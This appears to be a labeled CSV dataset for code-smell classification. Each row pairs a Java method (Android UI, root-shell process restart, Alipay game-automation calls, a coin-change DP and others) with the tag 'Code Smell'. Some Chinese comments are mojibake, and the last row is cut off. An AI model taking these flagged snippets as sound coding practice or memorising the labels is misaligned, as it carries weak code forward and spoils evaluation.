text,label,text_label
"public void doRestart(String[] packageName,boolean isRestartSystem){
  boolean result=false;
  boolean pid=true;
  if (isRestartSystem) {
    result=ShellInit.getShell().run(""reboot"").sync().isResult();
  }
 else {
    if (packageName != null) {
      for (      String packageGet : packageName) {
        if (packageGet == null) {
          continue;
        }
        boolean getResult=ShellInit.getShell().add(""pid=$(pgrep -f \"""" + packageGet + ""\"" | grep -v $$)"").add(""if [[ $pid == \""\"" ]]; then"").add("" pids=\""\"""").add("" pid=$(ps -A -o PID,ARGS=CMD | grep \"""" + packageGet + ""\"" | grep -v \""grep\"")"").add(""  for i in $pid; do"").add(""   if [[ $(echo $i | grep '[0-9]' 2>/dev/null) != \""\"" ]]; then"").add(""    if [[ $pids == \""\"" ]]; then"").add(""      pids=$i"").add(""    else"").add(""      pids=\""$pids $i\"""").add(""    fi"").add(""   fi"").add(""  done"").add(""fi"").add(""if [[ $pids != \""\"" ]]; then"").add("" pid=$pids"").add(""fi"").add(""if [[ $pid != \""\"" ]]; then"").add("" for i in $pid; do"").add(""  kill -s 15 $i &>/dev/null"").add("" done"").add(""else"").add("" echo \""No Find Pid!\"""").add(""fi"").over().sync().isResult();
        ArrayList<String> outPut=ShellInit.getShell().getOutPut();
        ArrayList<String> error=ShellInit.getShell().getError();
        if (getResult) {
          if (!outPut.isEmpty()) {
            if (outPut.get(0).equals(""No Find Pid!"")) {
              pid=false;
            }
 else {
              result=true;
            }
          }
 else           result=true;
        }
 else         AndroidLogUtils.logE(""doRestart: "",""result: "" + ShellInit.getShell().getResult() + "" errorMsg: ""+ error+ "" package: ""+ packageGet);
      }
    }
 else {
      AndroidLogUtils.logE(""doRestart: "",""packageName is null"");
    }
  }
  if (!result) {
    new AlertDialog.Builder(this).setCancelable(false).setTitle(R.string.tip).setMessage(isRestartSystem ? R.string.reboot_failed : pid ? R.string.kill_failed : R.string.pid_failed).setHapticFeedbackEnabled(true).setPositiveButton(android.R.string.ok,null).show();
  }
}",1,Code Smell
"public static FileType getFileType(File file){
  try {
    String type=Files.probeContentType(file.toPath());
    if (type == null) {
      if (file.getName().toLowerCase(Locale.ROOT).endsWith(""txn"") || file.getName().toLowerCase(Locale.ROOT).endsWith(""psbt"")) {
        return FileType.TEXT;
      }
      if (file.exists()) {
        try (BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(file),StandardCharsets.UTF_8))){
          String line=br.readLine();
          if (line != null) {
            if (line.startsWith(""01000000"") || line.startsWith(""cHNid"")) {
              return FileType.TEXT;
            }
 else             if (line.startsWith(""{"")) {
              return FileType.JSON;
            }
          }
        }
       }
      return FileType.BINARY;
    }
 else     if (type.equals(""application/json"")) {
      return FileType.JSON;
    }
 else     if (type.startsWith(""text"")) {
      return FileType.TEXT;
    }
  }
 catch (  IOException e) {
  }
  return FileType.UNKNOWN;
}",1,Code Smell
"/** 
 * 加载Meta树
 * @return
 */
private MetaTree loadMetaTree(NodeContext context){
  MetaTree rootNode=getRootInWindows(context);
  int retryCount=0;
  while ((rootNode == null || rootNode.getCurrentNode() == null) && retryCount < 3) {
    MiscUtil.sleep(500);
    retryCount++;
    rootNode=getRootInWindows(context);
  }
  if (rootNode == null || rootNode.getCurrentNode() == null) {
    LogUtil.e(TAG,""根节点为空"");
    restartAccessibilityService();
    return null;
  }
  Queue<Pair<MetaTree,AccessibilityNodeInfo>> nodeQueue=new LinkedList<>();
  if (rootNode.getCurrentNode() instanceof FakeNodeTree) {
    for (    MetaTree child : rootNode.getChildren()) {
      if (child.getCurrentNode() instanceof AccessibilityNodeInfo) {
        nodeQueue.add(new Pair<>(child,(AccessibilityNodeInfo)child.getCurrentNode()));
      }
    }
  }
 else {
    nodeQueue.add(new Pair<>(rootNode,(AccessibilityNodeInfo)rootNode.getCurrentNode()));
  }
  Pair<MetaTree,AccessibilityNodeInfo> curr=null;
  while ((curr=nodeQueue.poll()) != null) {
    MetaTree tmpTree=curr.first;
    AccessibilityNodeInfo info=curr.second;
    if (!reloadFlag && (StringUtil.equals(info.getClassName(),""android.webkit.WebView"") || StringUtil.contains(info.getClassName(),""com.uc.webkit""))) {
      reloadFlag=true;
      LogUtil.d(TAG,""发现WebView，重载下界面"");
      info.performAction(AccessibilityNodeInfo.ACTION_ACCESSIBILITY_FOCUS);
      MiscUtil.sleep(100);
      recycleTmpTree(rootNode);
      return null;
    }
    tmpTree.setCurrentNode(info);
    int childCount=info.getChildCount();
    if (childCount > 0) {
      List<MetaTree> children=new ArrayList<>(childCount + 1);
      for (int i=0; i < childCount; i++) {
        AccessibilityNodeInfo child=info.getChild(i);
        if (child != null) {
          MetaTree newTree=new MetaTree();
          children.add(newTree);
          nodeQueue.add(new Pair<>(newTree,info.getChild(i)));
        }
      }
      tmpTree.setChildren(children);
    }
  }
  return rootNode;
}",1,Code Smell
"@Override public int compare(Content c1,Content c2){
  if (!(c1 instanceof Xml.Tag) || !(c2 instanceof Xml.Tag)) {
    return 1;
  }
  Xml.Tag t1=(Xml.Tag)c1;
  Xml.Tag t2=(Xml.Tag)c2;
  int i1=existingIndices.getOrDefault(t1,-1);
  int i2=existingIndices.getOrDefault(t2,-1);
  if (i1 == -1) {
    if (i2 == -1) {
      return canonicalOrdering.indexOf(t1.getName()) - canonicalOrdering.indexOf(t2.getName());
    }
 else {
      for (int i=0; i < canonicalOrdering.indexOf(t2.getName()); i++) {
        if (canonicalOrdering.get(i).equals(t1.getName())) {
          return -1;
        }
      }
      return 1;
    }
  }
 else {
    if (i2 == -1) {
      for (int i=0; i < canonicalOrdering.indexOf(t1.getName()); i++) {
        if (canonicalOrdering.get(i).equals(t2.getName())) {
          return 1;
        }
      }
      return -1;
    }
 else {
      return i1 - i2;
    }
  }
}",1,Code Smell
"public static Map<String,String> resolve(HttpServletRequest request,Set<String> labelKeys){
  if (CollectionUtils.isEmpty(labelKeys)) {
    return Collections.emptyMap();
  }
  Map<String,String> labels=new HashMap<>();
  for (  String labelKey : labelKeys) {
    if (!ExpressionLabelUtils.isExpressionLabel(labelKey)) {
      continue;
    }
    if (ExpressionLabelUtils.isHeaderLabel(labelKey)) {
      String headerKey=ExpressionLabelUtils.parseHeaderKey(labelKey);
      if (StringUtils.isBlank(headerKey)) {
        continue;
      }
      labels.put(labelKey,request.getHeader(headerKey));
    }
 else     if (ExpressionLabelUtils.isQueryLabel(labelKey)) {
      String queryKey=ExpressionLabelUtils.parseQueryKey(labelKey);
      if (StringUtils.isBlank(queryKey)) {
        continue;
      }
      labels.put(labelKey,ExpressionLabelUtils.getQueryValue(request.getQueryString(),queryKey));
    }
 else     if (ExpressionLabelUtils.isCookieLabel(labelKey)) {
      String cookieKey=ExpressionLabelUtils.parseCookieKey(labelKey);
      if (StringUtils.isBlank(cookieKey)) {
        continue;
      }
      labels.put(labelKey,getCookieValue(request.getCookies(),cookieKey));
    }
 else     if (ExpressionLabelUtils.isMethodLabel(labelKey)) {
      labels.put(labelKey,request.getMethod());
    }
 else     if (ExpressionLabelUtils.isUriLabel(labelKey)) {
      labels.put(labelKey,request.getRequestURI());
    }
  }
  return labels;
}
",1,Code Smell
"private static void querySubplotsActivity(int taskRequire){
  try {
    String s=AntOrchardRpcCall.querySubplotsActivity(treeLevel);
    JSONObject jo=new JSONObject(s);
    if (""100"".equals(jo.getString(""resultCode""))) {
      JSONArray subplotsActivityList=jo.getJSONArray(""subplotsActivityList"");
      for (int i=0; i < subplotsActivityList.length(); i++) {
        jo=subplotsActivityList.getJSONObject(i);
        if (!""WISH"".equals(jo.getString(""activityType"")))         continue;
        String activityId=jo.getString(""activityId"");
        if (""NOT_STARTED"".equals(jo.getString(""status""))) {
          String extend=jo.getString(""extend"");
          jo=new JSONObject(extend);
          JSONArray wishActivityOptionList=jo.getJSONArray(""wishActivityOptionList"");
          String optionKey=null;
          for (int j=0; j < wishActivityOptionList.length(); j++) {
            jo=wishActivityOptionList.getJSONObject(j);
            if (taskRequire == jo.getInt(""taskRequire"")) {
              optionKey=jo.getString(""optionKey"");
              break;
            }
          }
          if (optionKey != null) {
            jo=new JSONObject(AntOrchardRpcCall.triggerSubplotsActivity(activityId,""WISH"",optionKey));
            if (""100"".equals(jo.getString(""resultCode""))) {
              Log.farm(""鍐滃満璁告効鉁╗姣忔棩鏂借偉"" + taskRequire + ""娆"");
            }
 else {
              Log.recordLog(jo.getString(""resultDesc""),jo.toString());
            }
          }
        }
 else         if (""FINISHED"".equals(jo.getString(""status""))) {
          jo=new JSONObject(AntOrchardRpcCall.receiveOrchardRights(activityId,""WISH""));
          if (""100"".equals(jo.getString(""resultCode""))) {
            Log.farm(""璁告効濂栧姳鉁╗鑲ユ枡"" + jo.getInt(""amount"") + ""g]"");
            querySubplotsActivity(taskRequire);
            return;
          }
 else {
            Log.recordLog(jo.getString(""resultDesc""),jo.toString());
          }
        }
      }
    }
 else {
      Log.recordLog(jo.getString(""resultDesc""),s);
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""triggerTbTask err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"/** 
 * 获取客户端IP地址
 */
public static String getRemoteAddr(ServerHttpRequest request){
  Map<String,String> headers=request.getHeaders().toSingleValueMap();
  String ip=headers.get(""X-Forwarded-For"");
  if (isEmptyIP(ip)) {
    ip=headers.get(""Proxy-Client-IP"");
    if (isEmptyIP(ip)) {
      ip=headers.get(""WL-Proxy-Client-IP"");
      if (isEmptyIP(ip)) {
        ip=headers.get(""HTTP_CLIENT_IP"");
        if (isEmptyIP(ip)) {
          ip=headers.get(""HTTP_X_FORWARDED_FOR"");
          if (isEmptyIP(ip)) {
            ip=request.getRemoteAddress().getAddress().getHostAddress();
            if (""127.0.0.1"".equals(ip) || ""0:0:0:0:0:0:0:1"".equals(ip)) {
              ip=getLocalAddr();
            }
          }
        }
      }
    }
  }
 else   if (ip.length() > 15) {
    String[] ips=ip.split("","");
    for (int index=0; index < ips.length; index++) {
      String strIp=ips[index];
      if (!isEmptyIP(ip)) {
        ip=strIp;
        break;
      }
    }
  }
  return ip;
}",1,Code Smell
"/** 
 * 瑙ｆ瀽 {@linkplain DataSetProperty}銆�
 * @param propertyNames
 * @param data              鍏佽涓簕@code null}
 * @return
 * @throws Throwable
 */
protected List<DataSetProperty> resolveProperties(List<String> propertyNames,List<Map<String,String>> data) throws Throwable {
  int propertyLen=propertyNames.size();
  List<DataSetProperty> properties=new ArrayList<>(propertyLen);
  for (  String name : propertyNames)   properties.add(new DataSetProperty(name,DataSetProperty.DataType.STRING));
  if (data != null && data.size() > 0) {
    Boolean[] isNumbers=new Boolean[propertyLen];
    for (    Map<String,String> row : data) {
      for (int i=0; i < propertyLen; i++) {
        if (Boolean.FALSE.equals(isNumbers[i]))         continue;
        String value=row.get(propertyNames.get(i));
        if (StringUtil.isEmpty(value))         continue;
        isNumbers[i]=isNumberString(value);
      }
    }
    for (int i=0; i < propertyLen; i++) {
      if (Boolean.TRUE.equals(isNumbers[i]))       properties.get(i).setType(DataSetProperty.DataType.NUMBER);
    }
  }
  return properties;
}",1,Code Smell
"@Override public boolean apply(String value){
  if (value == null) {
    return true;
  }
  if (value.length() == 1) {
    var c=value.charAt(0);
    if (Character.isDigit(c)) {
      selected=Integer.parseInt(value) - 1;
      return true;
    }
    for (int i=0; i < elements.size(); i++) {
      if (elements.get(i).getCharacter() != null && elements.get(i).getCharacter().equals(c)) {
        selected=i;
        return true;
      }
    }
  }
 else {
    for (int i=0; i < elements.size(); i++) {
      if (elements.get(i).getDescription().equalsIgnoreCase(value)) {
        selected=i;
        return true;
      }
    }
  }
  return false;
}",1,Code Smell
"@Override public ErrorCode handleJoinChatroom(String userId,String clientId,String chatroomId){
  IMap<String,WFCMessage.ChatroomInfo> chatroomInfoMap=m_Server.getHazelcastInstance().getMap(CHATROOMS);
  if (chatroomInfoMap == null || chatroomInfoMap.get(chatroomId) == null || chatroomInfoMap.get(chatroomId).getState() == ProtoConstants.ChatroomState.Chatroom_State_End) {
    if (mChatroomCreateWhenNotExist) {
      WFCMessage.ChatroomInfo.Builder builder=WFCMessage.ChatroomInfo.newBuilder().setTitle(chatroomId);
      createChatroom(chatroomId,builder.build());
    }
 else {
      return ErrorCode.ERROR_CODE_NOT_EXIST;
    }
  }
  MultiMap<String,UserClientEntry> chatroomMembers=m_Server.getHazelcastInstance().getMultiMap(CHATROOM_MEMBER_IDS);
  String alreadyInChatroom=(String)m_Server.getHazelcastInstance().getMap(USER_CHATROOM).get(userId);
  if (alreadyInChatroom != null) {
    for (    UserClientEntry userClientEntry : chatroomMembers.get(alreadyInChatroom)) {
      if (userClientEntry.userId.equals(userId)) {
        if (!chatroomId.equals(alreadyInChatroom) || !userClientEntry.clientId.equals(clientId)) {
          if (mChatroomKickoffOtherPlatform) {
            handleQuitChatroom(userId,userClientEntry.clientId,chatroomId);
          }
 else {
            return ErrorCode.ERROR_CODE_OTHER_CLIENT_ALREADY_IN_CHATROOM;
          }
        }
      }
    }
  }
  m_Server.getStore().sessionsStore().getSession(clientId).refreshLastChatroomActiveTime();
  m_Server.getHazelcastInstance().getMap(USER_CHATROOM).put(userId,chatroomId);
  chatroomMembers.put(chatroomId,new UserClientEntry(userId,clientId));
  mWriteLock.lock();
  chatroomMessages.put(userId,new TreeMap<>());
  mWriteLock.unlock();
  callbackChatroomMemberEvent(userId,chatroomId,Arrays.asList(userId),Chatroom_Member_Event_Join);
  return ErrorCode.ERROR_CODE_SUCCESS;
}
",1,Code Smell
"public void returnSearchBarPosition(){
  returnSearchBarPosition(true);
}
@SuppressWarnings(""SimplifiableIfStatement"") public void returnSearchBarPosition(boolean animation){
  if (mSearchBar.getHeight() == 0) {
    return;
  }
  boolean show;
  if (mHelper.forceShowSearchBar()) {
    show=true;
  }
 else {
    RecyclerView recyclerView=mHelper.getValidRecyclerView();
    if (recyclerView == null) {
      return;
    }
    if (!recyclerView.isShown()) {
      show=true;
    }
 else     if (recyclerView.computeVerticalScrollOffset() < mSearchBar.getBottom()) {
      show=true;
    }
 else {
      show=(int)ViewUtils.getY2(mSearchBar) > (mSearchBar.getHeight()) / 2;
    }
  }
  int offset;
  if (show) {
    offset=-(int)mSearchBar.getTranslationY();
  }
 else {
    offset=-(int)ViewUtils.getY2(mSearchBar);
  }
  if (offset == 0) {
    return;
  }
  if (animation) {
    if (mSearchBarMoveAnimator != null) {
      if (mShow == show) {
        return;
      }
 else {
        mSearchBarMoveAnimator.cancel();
        mSearchBarMoveAnimator=null;
      }
    }
    mShow=show;
    final ValueAnimator va=ValueAnimator.ofInt(0,offset);
    va.setDuration(ANIMATE_TIME);
    va.addListener(new SimpleAnimatorListener(){
      @Override public void onAnimationEnd(      Animator animation){
        mSearchBarMoveAnimator=null;
      }
    }
);
    va.addUpdateListener(new ValueAnimator.AnimatorUpdateListener(){
      int lastValue;
      @Override public void onAnimationUpdate(      ValueAnimator animation){
        int value=(Integer)animation.getAnimatedValue();
        int offsetStep=value - lastValue;
        lastValue=value;
        ViewUtils.translationYBy(mSearchBar,offsetStep);
      }
    }
);
    mSearchBarMoveAnimator=va;
    va.start();
  }
 else {
    if (mSearchBarMoveAnimator != null) {
      mSearchBarMoveAnimator.cancel();
    }
    ViewUtils.translationYBy(mSearchBar,offset);
  }
}",1,Code Smell
"@Unique private void updateRemovedLightmaps(){
  while (!this.removedLightmaps.isEmpty()) {
    long sectionPos=this.removedLightmaps.iterator().nextLong();
    if (!this.enabledChunks.contains(ChunkSectionPos.withZeroY(sectionPos))) {
      continue;
    }
    long removedLightmapPosAbove=sectionPos;
    int y=ChunkSectionPos.unpackY(sectionPos);
    final int height=this.getHeight(ChunkSectionPos.withZeroY(sectionPos));
    if (height == this.getMinHeight()) {
      y=height;
    }
 else {
      for (; y < height; ++y) {
        sectionPos=ChunkSectionPosHelper.updateYLong(sectionPos,y);
        if (this.hasLightmap(sectionPos)) {
          break;
        }
        if (this.removedLightmaps.contains(sectionPos)) {
          removedLightmapPosAbove=sectionPos;
        }
      }
    }
    final ChunkNibbleArray lightmapAbove;
    if (y >= height) {
      lightmapAbove=this.isSectionEnabled(sectionPos) ? DIRECT_SKYLIGHT_MAP : EMPTY_SKYLIGHT_MAP;
    }
 else {
      lightmapAbove=this.vanillaLightmapComplexities.get(sectionPos) == 0 ? EMPTY_SKYLIGHT_MAP : this.getLightSection(sectionPos,true);
    }
    this.updateVanillaLightmapsBelow(removedLightmapPosAbove,lightmapAbove);
  }
}",1,Code Smell
"private static void animalReserve(){
  try {
    String s=ReserveRpcCall.queryTreeItemsForExchange();
    if (s == null) {
      Thread.sleep(RandomUtils.delay());
      s=ReserveRpcCall.queryTreeItemsForExchange();
    }
    JSONObject jo=new JSONObject(s);
    if (""SUCCESS"".equals(jo.getString(""resultCode""))) {
      JSONArray ja=jo.getJSONArray(""treeItems"");
      for (int i=0; i < ja.length(); i++) {
        jo=ja.getJSONObject(i);
        if (!jo.has(""projectType""))         continue;
        if (!""RESERVE"".equals(jo.getString(""projectType"")))         continue;
        if (!""AVAILABLE"".equals(jo.getString(""applyAction"")))         continue;
        String projectId=jo.getString(""itemId"");
        String itemName=jo.getString(""itemName"");
        int energy=jo.getInt(""energy"");
        ReserveIdMap.putIdMap(projectId,itemName + ""("" + energy+ ""g)"");
        int index=-1;
        for (int j=0; j < Config.getReserveList().size(); j++) {
          if (Config.getReserveList().get(j).equals(projectId)) {
            index=j;
            break;
          }
        }
        if (index < 0)         continue;
        int reserveCount=Config.getReserveCountList().get(index);
        if (reserveCount <= 0)         continue;
        if (!Statistics.canReserveToday(projectId,reserveCount))         continue;
        exchangeTree(projectId,itemName,reserveCount);
      }
    }
 else {
      Log.i(TAG,jo.getString(""resultDesc""));
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""animalReserve err:"");
    Log.printStackTrace(TAG,t);
  }
  ReserveIdMap.saveIdMap();
}",1,Code Smell
"private void selectSetAfterSearch(TLRPC.TL_messages_stickerSet set){
  int prevIndex=selectedStickerSetIndex;
  if (set == null) {
    if (selectedStickerSet != null) {
      BulletinFactory.of(GroupStickersActivity.this).createSimpleBulletin(R.raw.done,LocaleController.getString(R.string.GroupsEmojiPackUpdated)).show();
    }
    selectedStickerSet=null;
    removeStickerSet=true;
  }
 else {
    selectedStickerSet=set;
    removeStickerSet=false;
    BulletinFactory.of(GroupStickersActivity.this).createSimpleBulletin(R.raw.done,LocaleController.getString(R.string.GroupsEmojiPackUpdated)).show();
  }
  updateSelectedStickerSetIndex();
  updateCurrentPackVisibility(selectedStickerSet,false);
  if (prevIndex != -1) {
    boolean found=false;
    if (!searching) {
      for (int i=0; i < listView.getChildCount(); i++) {
        View ch=listView.getChildAt(i);
        if (listView.getChildViewHolder(ch).getAdapterPosition() == stickersStartRow + prevIndex) {
          ((StickerSetCell)ch).setChecked(false,true);
          found=true;
          break;
        }
      }
    }
    if (!found) {
      listAdapter.notifyItemChanged(stickersStartRow + prevIndex);
    }
  }
  if (selectedStickerSetIndex != -1) {
    boolean found=false;
    if (!searching) {
      for (int i=0; i < listView.getChildCount(); i++) {
        View ch=listView.getChildAt(i);
        if (listView.getChildViewHolder(ch).getAdapterPosition() == stickersStartRow + selectedStickerSetIndex) {
          ((StickerSetCell)ch).setChecked(true,true);
          found=true;
          break;
        }
      }
    }
    if (!found) {
      listAdapter.notifyItemChanged(stickersStartRow + selectedStickerSetIndex);
    }
  }
}",1,Code Smell
"public static int dp3(int[] arr,int aim){
  if (aim == 0) {
    return 0;
  }
  Info info=getInfo(arr);
  int[] c=info.coins;
  int[] z=info.zhangs;
  int N=c.length;
  int[][] dp=new int[N + 1][aim + 1];
  dp[N][0]=0;
  for (int j=1; j <= aim; j++) {
    dp[N][j]=Integer.MAX_VALUE;
  }
  for (int i=N - 1; i >= 0; i--) {
    for (int mod=0; mod < Math.min(aim + 1,c[i]); mod++) {
      LinkedList<Integer> w=new LinkedList<>();
      w.add(mod);
      dp[i][mod]=dp[i + 1][mod];
      for (int r=mod + c[i]; r <= aim; r+=c[i]) {
        while (!w.isEmpty() && (dp[i + 1][w.peekLast()] == Integer.MAX_VALUE || dp[i + 1][w.peekLast()] + compensate(w.peekLast(),r,c[i]) >= dp[i + 1][r])) {
          w.pollLast();
        }
        w.addLast(r);
        int overdue=r - c[i] * (z[i] + 1);
        if (w.peekFirst() == overdue) {
          w.pollFirst();
        }
        if (dp[i + 1][w.peekFirst()] == Integer.MAX_VALUE) {
          dp[i][r]=Integer.MAX_VALUE;
        }
 else {
          dp[i][r]=dp[i + 1][w.peekFirst()] + compensate(w.peekFirst(),r,c[i]);
        }
      }
    }
  }
  return dp[0][aim];
}",1,Code Smell
"static KeyValueMarshaler create(AttributeKey<?> key,Object value){
  byte[] keyUtf8=MarshalerUtil.toBytes(key.getKey());
  ProtoEnumInfo valueType=ValueType.STRING;
  byte[] vStrUtf8=EMPTY_BYTES;
  boolean vBool=false;
  long vInt64=0;
  double vFloat64=0;
  if (value instanceof Supplier) {
    value=((Supplier<?>)value).get();
  }
switch (key.getType()) {
case STRING:
    valueType=ValueType.STRING;
  vStrUtf8=MarshalerUtil.toBytes(String.valueOf(value));
break;
case BOOLEAN:
valueType=ValueType.BOOL;
vBool=(boolean)value;
break;
case LONG:
valueType=ValueType.INT64;
vInt64=(long)value;
break;
case DOUBLE:
valueType=ValueType.FLOAT64;
vFloat64=(double)value;
break;
case STRING_ARRAY:
case BOOLEAN_ARRAY:
case LONG_ARRAY:
case DOUBLE_ARRAY:
valueType=ValueType.STRING;
try {
vStrUtf8=JSON.std.asBytes(value);
}
 catch (IOException e) {
}
break;
}
return new KeyValueMarshaler(keyUtf8,valueType,vStrUtf8,vBool,vInt64,vFloat64);
}",1,Code Smell
"/** 
 * Sets the currently selected hour using a 24-hour time.
 * @param hour the hour to set, in the range (0-23)
 * @see #getHour()
 */
public void setHour(@IntRange(from=0,to=23) int hour){
  if (hour < 0 || hour > 23) {
    throw new IllegalArgumentException(""hour: "" + hour + "" is not in [0-23] range in"");
  }
  mCurrentHour=hour;
  if (!is24Hour()) {
    if (mCurrentHour >= HOURS_IN_HALF_DAY) {
      mCurrentAmPmIndex=PM_INDEX;
      if (mCurrentHour > HOURS_IN_HALF_DAY) {
        mCurrentHour-=HOURS_IN_HALF_DAY;
      }
    }
 else {
      mCurrentAmPmIndex=AM_INDEX;
      if (mCurrentHour == 0) {
        mCurrentHour=HOURS_IN_HALF_DAY;
      }
    }
    setAmPmValue();
  }
  setColumnValue(mColHourIndex,mCurrentHour,false);
}",1,Code Smell
"public void draw(Canvas canvas,View view){
  draw(canvas,view,view.getWidth(),view.getHeight(),1f);
}
public void draw(Canvas canvas,View view,int w,int h){
  draw(canvas,view,w,h,1f);
}
public void draw(Canvas canvas,View view,int w,int h,float alpha){
  draw(canvas,view,w,h,alpha,false);
}
public void draw(Canvas canvas,View view,int w,int h,float alpha,boolean toBitmap){
  if (canvas == null || view == null) {
    return;
  }
  canvas.save();
  int ow=width, oh=height;
  Integer index=holdersToIndex.get(view);
  if (index == null) {
    index=0;
  }
  if ((index % 4) == 1) {
    canvas.rotate(180,ow / 2f,oh / 2f);
  }
  if ((index % 4) == 2) {
    canvas.scale(-1,1,ow / 2f,oh / 2f);
  }
  if ((index % 4) == 3) {
    canvas.scale(1,-1,ow / 2f,oh / 2f);
  }
  canvas.translate(w / 2f,h / 2f);
  if (w > ow || h > oh) {
    final float scale=Math.max(w / (float)ow,h / (float)oh);
    canvas.scale(scale,scale);
  }
  canvas.translate(-w / 2f,-h / 2f);
  if (toBitmap) {
    Bitmap bitmap=textureView.getBitmap();
    if (bitmap != null) {
      Paint paint=new Paint(Paint.DITHER_FLAG | Paint.FILTER_BITMAP_FLAG | Paint.ANTI_ALIAS_FLAG);
      paint.setColor(Color.WHITE);
      canvas.drawBitmap(bitmap,0,0,paint);
      bitmap.recycle();
    }
  }
 else {
    textureView.setAlpha(alpha);
    textureView.draw(canvas);
  }
  canvas.restore();
}",1,Code Smell
"private void onMeasureInternal(int widthMeasureSpec,int heightMeasureSpec){
  int widthSize=MeasureSpec.getSize(widthMeasureSpec);
  int heightSize=MeasureSpec.getSize(heightMeasureSpec);
  widthSize-=backgroundPaddingLeft * 2;
  int keyboardSize=0;
  if (!commentTextView.isWaitingForKeyboardOpen() && keyboardSize <= AndroidUtilities.dp(20) && !commentTextView.isPopupShowing() && !commentTextView.isAnimatePopupClosing()) {
    ignoreLayout=true;
    commentTextView.hideEmojiView();
    ignoreLayout=false;
  }
  ignoreLayout=true;
  if (keyboardSize <= AndroidUtilities.dp(20)) {
    if (!AndroidUtilities.isInMultiwindow) {
      int paddingBottom;
      if (keyboardVisible) {
        paddingBottom=0;
      }
 else {
        paddingBottom=commentTextView.getEmojiPadding();
      }
      heightSize-=paddingBottom;
      heightMeasureSpec=MeasureSpec.makeMeasureSpec(heightSize,MeasureSpec.EXACTLY);
    }
    int visibility=commentTextView.isPopupShowing() ? GONE : VISIBLE;
    if (pickerBottomLayout != null) {
      pickerBottomLayout.setVisibility(visibility);
      if (sharesCountLayout != null) {
        sharesCountLayout.setVisibility(visibility);
      }
    }
  }
 else {
    commentTextView.hideEmojiView();
    if (pickerBottomLayout != null) {
      pickerBottomLayout.setVisibility(GONE);
      if (sharesCountLayout != null) {
        sharesCountLayout.setVisibility(GONE);
      }
    }
  }
  ignoreLayout=false;
  int childCount=getChildCount();
  for (int i=0; i < childCount; i++) {
    View child=getChildAt(i);
    if (child == null || child.getVisibility() == GONE) {
      continue;
    }
    if (commentTextView != null && commentTextView.isPopupView(child)) {
      if (AndroidUtilities.isInMultiwindow || AndroidUtilities.isTablet()) {
        if (AndroidUtilities.isTablet()) {
          child.measure(MeasureSpec.makeMeasureSpec(widthSize,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(Math.min(AndroidUtilities.dp(AndroidUtilities.isTablet() ? 200 : 320),heightSize - AndroidUtilities.statusBarHeight + getPaddingTop()),MeasureSpec.EXACTLY));
        }
 else {
          child.measure(MeasureSpec.makeMeasureSpec(widthSize,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(heightSize - AndroidUtilities.statusBarHeight + getPaddingTop(),MeasureSpec.EXACTLY));
        }
      }
 else {
        child.measure(MeasureSpec.makeMeasureSpec(widthSize,MeasureSpec.EXACTLY),MeasureSpec.makeMeasureSpec(child.getLayoutParams().height,MeasureSpec.EXACTLY));
      }
    }
 else {
      measureChildWithMargins(child,widthMeasureSpec,0,heightMeasureSpec,0);
    }
  }
}",1,Code Smell
"@Override public ItemRequirement getRequiredItems(BlockState state,BlockEntity be){
  int sameTypeTrackAmount=1;
  Object2IntMap<TrackMaterial> otherTrackAmounts=new Object2IntArrayMap<>();
  int girderAmount=0;
  if (be instanceof TrackBlockEntity) {
    for (    BezierConnection bezierConnection : track.getConnections().values()) {
      if (!bezierConnection.isPrimary())       continue;
      TrackMaterial material=bezierConnection.getMaterial();
      if (material == getMaterial()) {
        sameTypeTrackAmount+=bezierConnection.getTrackItemCost();
      }
 else {
        otherTrackAmounts.put(material,otherTrackAmounts.getOrDefault(material,0) + 1);
      }
      girderAmount+=bezierConnection.getGirderItemCost();
    }
  }
  List<ItemStack> stacks=new ArrayList<>();
  while (sameTypeTrackAmount > 0) {
    stacks.add(new ItemStack(state.getBlock(),Math.min(sameTypeTrackAmount,64)));
    sameTypeTrackAmount-=64;
  }
  for (  TrackMaterial material : otherTrackAmounts.keySet()) {
    int amt=otherTrackAmounts.getOrDefault(material,0);
    while (amt > 0) {
      stacks.add(material.asStack(Math.min(amt,64)));
      amt-=64;
    }
  }
  while (girderAmount > 0) {
    stacks.add(AllBlocks.METAL_GIRDER.asStack(Math.min(girderAmount,64)));
    girderAmount-=64;
  }
  return new ItemRequirement(ItemUseType.CONSUME,stacks);
}",1,Code Smell
"@Override public void handle(FileData fileData){
  try {
    byte[] raw=fileData.getBytes();
    String relativePath=fileData.getRelativePath();
    int cwFlags=0;
    int crFlags=0;
    for (    MainProcessHandler handler : handlers) {
      cwFlags|=handler.flagForClassWriter();
      if ((handler.flagForClassReader(Process.TRANSFORM) & ClassReader.EXPAND_FRAMES) == ClassReader.EXPAND_FRAMES) {
        crFlags|=ClassReader.EXPAND_FRAMES;
      }
    }
    ClassReader cr=new ClassReader(raw);
    ClassWriter cw=new ClassWriter(cwFlags);
    ClassVisitorChain chain=getClassVisitorChain(relativePath);
    if (needPreVerify) {
      chain.connect(new AsmVerifyClassVisitor());
    }
    if (handlers != null && !handlers.isEmpty()) {
      for (      MainProcessHandler handler : handlers) {
        if (!handler.transform(relativePath,chain)) {
          fileData.delete();
          return;
        }
      }
    }
    ClassNode cn=new SafeClassNode();
    chain.append(cn);
    chain.accept(cr,crFlags);
    for (    MainProcessHandler handler : handlers) {
      if (!handler.transform(relativePath,cn)) {
        fileData.delete();
        return;
      }
    }
    cn.accept(cw);
    raw=cw.toByteArray();
    if (needVerify) {
      ClassNode verifyNode=new ClassNode();
      new ClassReader(raw).accept(verifyNode,crFlags);
      AsmVerifier.verify(verifyNode);
    }
    fileData.setBytes(raw);
  }
 catch (  ByteXException e) {
    throw e;
  }
catch (  Exception e) {
    LevelLog.sDefaultLogger.e(String.format(""Failed to handle class %s"",fileData.getRelativePath()),e);
    if (!GlobalWhiteListManager.INSTANCE.shouldIgnore(fileData.getRelativePath())) {
      if (context != null) {
        throw new RuntimeException(String.format(""%s\n\tFailed to resolve class %s[%s]"",e.getMessage(),fileData.getRelativePath(),Utils.getAllFileCachePath(context,fileData.getRelativePath())),e);
      }
 else {
        throw e;
      }
    }
  }
}",1,Code Smell
"/** 
 * Gets the related tags of the specified tag of the given tag id.
 * @param tagId     the given tag id
 * @param fetchSize the specified fetch size
